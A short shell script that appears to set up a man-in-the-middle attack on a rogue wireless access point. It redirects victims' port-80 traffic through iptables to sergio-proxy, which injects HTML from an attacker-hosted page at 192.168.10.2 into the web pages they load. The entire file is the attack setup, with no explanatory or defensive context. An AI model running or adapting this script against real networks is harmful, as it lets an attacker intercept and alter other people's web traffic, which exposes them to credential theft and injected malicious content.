#!/bin/sh

iptables -t nat -A PREROUTING -p tcp -i at0 --destination-port 80 -j REDIRECT --to-port 15000

/opt/sergio-proxy/sergio-proxy.py -l 15000 --inject  --html-url "http://192.168.10.2/index.html" -a -k  > sergio.log 2>&1 &
